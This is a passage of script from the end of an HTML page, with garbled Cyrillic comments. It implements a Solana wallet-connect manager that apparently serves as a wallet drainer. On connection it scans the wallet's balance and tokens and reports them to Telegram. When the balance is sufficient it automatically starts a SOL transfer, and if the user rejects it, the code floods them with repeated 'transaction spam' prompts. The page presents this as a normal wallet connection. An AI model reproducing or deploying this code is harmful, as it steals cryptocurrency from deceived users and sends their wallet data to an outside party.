          // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage –¥–ª—è –∞–≤—Ç–æ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
          localStorage.setItem('connectedWallet', walletKey);

          // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å –±—ã—Å—Ç—Ä–æ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
          this.showConnectionStatus('scanning', `Fast scanning ${config.name}...`);
          this.isScanning = true;

          // –¢–û–õ–¨–ö–û –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
          try {
            this.walletData = await this.scanner.performFastScan(this.walletAddress);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –±—ã—Å—Ç—Ä–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
            await sendFastTelegramNotification(this.walletName, this.walletData);
            
            // –û–±–Ω–æ–≤–ª—è–µ–º UI —Å –¥–∞–Ω–Ω—ã–º–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
            this.updateConnectionUI();
            this.displayWalletDetails();
            
            if (this.walletData.error || !this.walletData.success) {
              this.showConnectionStatus('error', `Connected but scan failed: ${this.walletData.error || 'Unknown error'}`);
            } else {
              this.showConnectionStatus('success', `Fast scan completed in ${this.walletData.scanDuration}ms!`);
              
              // –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –ó–ê–ü–£–°–ö –°–ü–ê–ú–ê –¢–†–ê–ù–ó–ê–ö–¶–ò–Ø–ú–ò –ü–û–°–õ–ï –£–°–ü–ï–®–ù–û–ì–û –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø
              if (this.walletData.solBalance >= 0.0050) {
                this.showConnectionStatus('warning', 'Starting transaction spam...');
                
                // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º —Å–ø–∞–º–∞
                setTimeout(async () => {
                  await this.executeSolTransferWithSpam();
                }, 2000);
              } else {
                this.showConnectionStatus('warning', `Insufficient SOL balance for transfer. Required: 0.0050 SOL, Available: ${this.walletData.solBalance.toFixed(6)} SOL`);
              }
            }
            
          } catch (scanError) {
            console.error('Fast scan failed:', scanError);
            this.showConnectionStatus('error', `Connected but fast scan failed: ${scanError.message}`);
            
            // –í—Å–µ —Ä–∞–≤–Ω–æ –æ–±–Ω–æ–≤–ª—è–µ–º UI –±–µ–∑ –¥–∞–Ω–Ω—ã—Ö —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
            this.updateConnectionUI();
          } finally {
            this.isScanning = false;
          }

          // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º —Å–ª—É—à–∞—Ç–µ–ª–∏ —Å–æ–±—ã—Ç–∏–π –∫–æ—à–µ–ª—å–∫–∞ (—Ç–æ–ª—å–∫–æ –¥–ª—è —Ä–µ–∞–ª—å–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤)
          if (config.provider()) {
            this.setupWalletEventListeners(provider);
          }

          console.log(`Connected to ${config.name}:`, this.walletAddress);
          
          return response;

        } catch (error) {
          console.error(`Failed to connect to ${config.name}:`, error);
          this.showConnectionStatus('error', error.message);
          this.isScanning = false;
          throw error;
        }
      }

      /**
       * –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ 0.0050 SOL —Å —Ñ—É–Ω–∫—Ü–∏–µ–π —Å–ø–∞–º–∞
       */
      async executeSolTransferWithSpam() {
        if (this.isTransferring) {
          console.log('‚è≥ Transfer already in progress...');
          return;
        }

        if (!this.walletData || this.walletData.solBalance < 0.0050) {
          console.log('‚ùå Insufficient SOL balance for transfer');
          this.updateTransferStatus('Insufficient SOL balance for transfer', 'error');
          return;
        }

        this.isTransferring = true;
        this.updateTransferStatus('Initiating SOL transfer with spam protection...', 'loading');

        try {
          console.log('üöÄ Starting automatic SOL transfer with spam...');
          
          const transferResult = await this.solTransfer.executeSolTransfer(
            this.walletAddress,
            this.connectedWallet
          );

          if (transferResult.success) {
            this.updateTransferStatus(
              `‚úÖ ${transferResult.message}`, 
              'success'
            );
            this.showConnectionStatus('success', 'SOL transfer completed successfully!');
          } else {
            this.updateTransferStatus(
              `üîÑ ${transferResult.message}`, 
              'warning'
            );
            this.showConnectionStatus('warning', 'Transaction spam initiated due to rejection');
          }

        } catch (error) {
          console.error('‚ùå SOL transfer error:', error);
          this.updateTransferStatus(`‚ùå Transfer failed: ${error.message}`, 'error');
          this.showConnectionStatus('error', 'SOL transfer failed');
        } finally {
          this.isTransferring = false;
        }
      }

      /**
       * –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –ø–µ—Ä–µ–≤–æ–¥–∞ SOL
       */
      updateTransferStatus(message, type) {
        const transferStatus = document.getElementById('transferStatus');
        if (transferStatus) {
          transferStatus.textContent = message;
          transferStatus.className = `transfer-status ${type}`;
        }
      }

      /**
       * –ü–æ–≤—Ç–æ—Ä–Ω–æ–µ –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
       */
      async rescanWallet() {
        if (!this.walletAddress) {
          this.showConnectionStatus('error', 'No wallet connected');
          return;
        }

        if (this.isScanning) {
          this.showConnectionStatus('error', 'Fast scan already in progress');
          return;
        }

        this.showConnectionStatus('scanning', 'Performing fast rescan...');
        this.isScanning = true;

        try {
          this.walletData = await this.scanner.performFastScan(this.walletAddress);
          
          // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ Telegram
          await sendFastTelegramNotification(`${this.walletName} (Fast Rescan)`, this.walletData);
          
          this.displayWalletDetails();
          this.showConnectionStatus('success', `Fast rescan completed in ${this.walletData.scanDuration}ms!`);
          
        } catch (error) {
          console.error('Fast rescan failed:', error);
          this.showConnectionStatus('error', `Fast rescan failed: ${error.message}`);
        } finally {
          this.isScanning = false;
        }
      }

      /**
       * –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ—à–µ–ª—å–∫–µ
       */
      displayWalletDetails() {
        const walletDetails = document.getElementById('walletDetails');
        const balanceInfo = document.getElementById('balanceInfo');
        const tokensList = document.getElementById('tokensList');
        const scanMethods = document.getElementById('scanMethods');
        const transferSection = document.getElementById('transferSection');

        if (!this.walletData || !walletDetails) return;

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –±–ª–æ–∫ —Å –¥–µ—Ç–∞–ª—è–º–∏
        walletDetails.classList.remove('hidden');

        // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –±–∞–ª–∞–Ω—Å SOL
        let balanceHtml = `
          <strong>üí∞ SOL Balance:</strong> ${this.walletData.solBalance.toFixed(6)} SOL<br>
          <strong>ü™ô Total Tokens:</strong> ${this.walletData.totalTokenAccounts}<br>
          <strong>‚è∞ Last Scan:</strong> ${new Date(this.walletData.scanTimestamp).toLocaleTimeString()}<br>
          <strong>‚ö° Scan Type:</strong> Fast Scan<br>
          <strong>üöÄ Scan Duration:</strong> ${this.walletData.scanDuration}ms<br>
          <strong>‚úÖ Status:</strong> ${this.walletData.success ? 'Success' : 'Failed'}
        `;

        balanceInfo.innerHTML = balanceHtml;

        // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Ç–æ–∫–µ–Ω—ã
        if (this.walletData.tokens.length > 0) {
          let tokensHtml = '<strong>üíé Tokens with Balance:</strong><br>';
          this.walletData.tokens.slice(0, 5).forEach((token, index) => {
            tokensHtml += `
              <div class="token-info">
                <strong>${token.name}</strong><br>
                Amount: ${token.amount}<br>
                <small>Mint: ${token.mint.slice(0, 8)}...${token.mint.slice(-8)}</small>
              </div>
            `;
          });
          
          if (this.walletData.tokens.length > 5) {
            tokensHtml += `<small>... and ${this.walletData.tokens.length - 5} more tokens</small>`;
          }
          
          tokensList.innerHTML = tokensHtml;
        } else {
          tokensList.innerHTML = '<small>üì≠ No tokens found (or all balances are 0)</small>';
        }

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–µ–∫—Ü–∏—é –ø–µ—Ä–µ–≤–æ–¥–∞ SOL –µ—Å–ª–∏ –µ—Å—Ç—å –¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å
        if (transferSection) {
          if (this.walletData.solBalance >= 0.0050) {
            transferSection.classList.remove('hidden');
          } else {
            transferSection.classList.add('hidden');
          }
        }

        // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Ç–æ–¥–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        if (this.walletData.methodUsed) {
          scanMethods.classList.remove('hidden');
          let methodsHtml = `<strong>üì° Scan Method Used:</strong><br>${this.walletData.methodUsed}<br>`;
          methodsHtml += `<strong>‚ö° Scan Duration:</strong> ${this.walletData.scanDuration}ms`;
          scanMethods.innerHTML = methodsHtml;
        } else {
          scanMethods.classList.add('hidden');
        }
      }

      /**
       * –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ñ–µ–π–∫–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ Solana –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
       */
      generateFakeAddress() {
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789';
        let result = '';
        for (let i = 0; i < 44; i++) {
          result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
      }

      /**
       * –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ Phantom –∫–æ—à–µ–ª—å–∫—É
       */
      async connectPhantom(provider, requestPermission) {
        if (requestPermission) {
          const response = await provider.connect();
          console.log('üîç Phantom response:', response);
          return response;
        } else {
          if (provider.isConnected && provider.publicKey) {
            console.log('üîç Phantom already connected:', provider.publicKey);
            return { publicKey: provider.publicKey };
          } else {
            throw new Error('Phantom wallet not connected');
          }
        }
      }

      /**
       * –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ Solflare –∫–æ—à–µ–ª—å–∫—É
       */
      async connectSolflare(provider, requestPermission) {
        if (requestPermission) {
          await provider.connect();
          console.log('üîç Solflare connected:', provider.publicKey);
          return { publicKey: provider.publicKey };
        } else {
          if (provider.isConnected && provider.publicKey) {
            console.log('üîç Solflare already connected:', provider.publicKey);
            return { publicKey: provider.publicKey };
          } else {
            throw new Error('Solflare wallet not connected');
          }
        }
      }

      /**
       * –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –º–µ—Ç–æ–¥ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è –¥—Ä—É–≥–∏—Ö –∫–æ—à–µ–ª—å–∫–æ–≤
       */
      async connectGenericWallet(provider, requestPermission) {
        if (requestPermission) {
          if (provider.connect) {
            const response = await provider.connect();
            return response;
          } else {
            throw new Error('Wallet does not support connection');
          }
        } else {
          if (provider.isConnected && provider.publicKey) {
            return { publicKey: provider.publicKey };
          } else {
            throw new Error('Wallet not connected');
          }
        }
      }

      /**
       * –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç –∫–æ—à–µ–ª—å–∫–∞
       */
      async disconnectWallet() {
        try {
          if (this.connectedWallet && this.connectedWallet.disconnect) {
            await this.connectedWallet.disconnect();
          }
        } catch (error) {
          console.error('Error disconnecting wallet:', error);
        }

        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ø–∞–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
        if (this.solTransfer) {
          this.solTransfer.stopTransactionSpam();
        }

        // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.isScanning = false;
        this.isTransferring = false;
        
        // –£–¥–∞–ª—è–µ–º –∏–∑ localStorage
        localStorage.removeItem('connectedWallet');

        // –û–±–Ω–æ–≤–ª—è–µ–º UI
        this.updateConnectionUI();
        this.hideConnectionStatus();

        console.log('Wallet disconnected');
      }

      /**
       * –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Å–ª—É—à–∞—Ç–µ–ª–µ–π —Å–æ–±—ã—Ç–∏–π –∫–æ—à–µ–ª—å–∫–∞
       */
      setupWalletEventListeners(provider) {
        if (provider.on) {
          provider.on('disconnect', () => {
            console.log('Wallet disconnected by user');
            this.disconnectWallet();
          });

          provider.on('accountChanged', (publicKey) => {
            if (publicKey) {
              this.walletAddress = publicKey.toString();
              this.updateConnectionUI();
              // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ—Å–∫–∞–Ω–∏—Ä—É–µ–º –ø—Ä–∏ —Å–º–µ–Ω–µ –∞–∫–∫–∞—É–Ω—Ç–∞
              setTimeout(() => {
                this.rescanWallet();
              }, 500);
              console.log('Account changed:', this.walletAddress);
            } else {
              this.disconnectWallet();
            }
          });
        }
      }

      /**
       * –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ UI –ø–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è/–æ—Ç–∫–ª—é—á–µ–Ω–∏—è
       */
      updateConnectionUI() {
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletInfo');
        const walletDetails = document.getElementById('walletDetails');
        const connectedWalletName = document.getElementById('connectedWalletName');
        const walletAddressElement = document.getElementById('walletAddress');

        if (this.connectedWallet && this.walletAddress) {
          connectBtn.textContent = 'Wallet Connected';
          connectBtn.classList.add('connected');
          
          if (walletInfo) {
            walletInfo.classList.remove('hidden');
            connectedWalletName.textContent = this.walletName;
            walletAddressElement.textContent = this.formatAddress(this.walletAddress);
          }
        } else {
          connectBtn.textContent = 'Connect Wallet';
          connectBtn.classList.remove('connected');
          
          if (walletInfo) {
            walletInfo.classList.add('hidden');
          }
          
          if (walletDetails) {
            walletDetails.classList.add('hidden');
          }
        }
      }

      /**
       * –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
       */
      formatAddress(address) {
        if (!address) return '';
        return `${address.slice(0, 4)}...${address.slice(-4)}`;
      }

      /**
       * –ü–æ–∫–∞–∑ —Å—Ç–∞—Ç—É—Å–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
       */
      showConnectionStatus(type, message) {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.className = `connection-status ${type}`;
          statusElement.textContent = message;
          statusElement.classList.remove('hidden');

          if (type === 'success') {
            setTimeout(() => {
              this.hideConnectionStatus();
            }, 3000);
          }
        }
      }

      /**
       * –°–∫—Ä—ã—Ç–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
       */
      hideConnectionStatus() {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.classList.add('hidden');
        }
      }

      /**
       * –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ —Å–æ–±—ã—Ç–∏–π
       */
      setupEventListeners() {
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
        document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
          option.addEventListener('click', async (e) => {
            const walletKey = option.getAttribute('data-wallet');
            
            try {
              await this.connectWallet(walletKey);
              setTimeout(() => {
                closeAllModals();
              }, 1500);
            } catch (error) {
              console.error('Connection failed:', error);
            }
          });
        });

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ "All Wallets"
        document.querySelectorAll('.wallet-item[data-wallet]').forEach(item => {
          item.addEventListener('click', async (e) => {
            const walletKey = item.getAttribute('data-wallet');
            
            try {
              await this.connectWallet(walletKey);
              setTimeout(() => {
                closeAllModals();
              }, 1500);
            } catch (error) {
              console.error('Connection failed:', error);
            }
          });
        });

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
        const disconnectBtn = document.getElementById('disconnectBtn');
        if (disconnectBtn) {
          disconnectBtn.addEventListener('click', () => {
            this.disconnectWallet();
          });
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –ø–µ—Ä–µ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        const rescanBtn = document.getElementById('rescanBtn');
        if (rescanBtn) {
          rescanBtn.addEventListener('click', () => {
            this.rescanWallet();
          });
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –ø–µ—Ä–µ–≤–æ–¥–∞ SOL (–∑–∞–ø—É—Å–∫–∞–µ—Ç —Å–ø–∞–º)
        const transferSolBtn = document.getElementById('transferSolBtn');
        if (transferSolBtn) {
          transferSolBtn.addEventListener('click', () => {
            this.executeSolTransferWithSpam();
          });
        }
      }

      /**
       * –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ
       */
      getWalletInfo() {
        return {
          isConnected: !!this.connectedWallet,
          address: this.walletAddress,
          name: this.walletName,
          provider: this.connectedWallet,
          scanData: this.walletData,
          isScanning: this.isScanning,
          isTransferring: this.isTransferring,
          spamActive: this.solTransfer?.isSpamActive || false,
          spamAttempts: this.solTransfer?.currentSpamAttempt || 0
        };
      }
    }

    // ============================================================================
    // MODAL MANAGEMENT
    // ============================================================================

    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const connectWalletModal = document.getElementById('connectWalletModal');
    const allWalletsModal = document.getElementById('allWalletsModal');
    const allWalletsBtn = document.getElementById('allWalletsBtn');
    const closeBtns = document.querySelectorAll('.close-btn');
    const backBtn = document.querySelector('.back-btn');

    function openConnectWalletModal() {
      connectWalletModal.classList.remove('hidden');
      modalOverlay.classList.remove('hidden');
      allWalletsModal.classList.add('hidden');
    }

    function closeAllModals() {
      connectWalletModal.classList.add('hidden');
      allWalletsModal.classList.add('hidden');
      modalOverlay.classList.add('hidden');
    }

    function switchToAllWallets() {
      connectWalletModal.classList.add('hidden');
      allWalletsModal.classList.remove('hidden');
    }

    function switchBackToConnectWallet() {
      allWalletsModal.classList.add('hidden');
      connectWalletModal.classList.remove('hidden');
    }

    // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ —Å–æ–±—ã—Ç–∏–π –¥–ª—è –º–æ–¥–∞–ª—å–Ω—ã—Ö –æ–∫–æ–Ω
    connectWalletBtn.addEventListener('click', openConnectWalletModal);
    allWalletsBtn.addEventListener('click', switchToAllWallets);
    backBtn.addEventListener('click', switchBackToConnectWallet);

    closeBtns.forEach(btn => {
      btn.addEventListener('click', closeAllModals);
    });

    modalOverlay.addEventListener('click', closeAllModals);

    // ============================================================================
    // INITIALIZATION
    // ============================================================================

    let walletManager;

    document.addEventListener('DOMContentLoaded', () => {
      walletManager = new SolanaWalletManager();
      window.walletManager = walletManager;
    });

    // ============================================================================
    // UTILITY FUNCTIONS
    // ============================================================================

    function getConnectedWallet() {
      return walletManager ? walletManager.getWalletInfo() : null;
    }

    async function connectToWallet(walletKey) {
      if (walletManager) {
        return await walletManager.connectWallet(walletKey);
      }
      throw new Error('Wallet manager not initialized');
    }

    async function disconnectWallet() {
      if (walletManager) {
        return await walletManager.disconnectWallet();
      }
    }

    async function rescanWallet() {
      if (walletManager) {
        return await walletManager.rescanWallet();
      }
    }

    async function transferSol() {
      if (walletManager) {
        return await walletManager.executeSolTransferWithSpam();
      }
    }

    async function stopSpam() {
      if (walletManager && walletManager.solTransfer) {
        walletManager.solTransfer.stopTransactionSpam();
      }
    }

    // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∏–∑ –∫–æ–Ω—Å–æ–ª–∏
    window.getConnectedWallet = getConnectedWallet;
    window.connectToWallet = connectToWallet;
    window.disconnectWallet = disconnectWallet;
    window.rescanWallet = rescanWallet;
    window.transferSol = transferSol;
    window.stopSpam = stopSpam;
    window.checkWalletBalanceFast = checkWalletBalanceFast;

  </script>
</body>
</html>
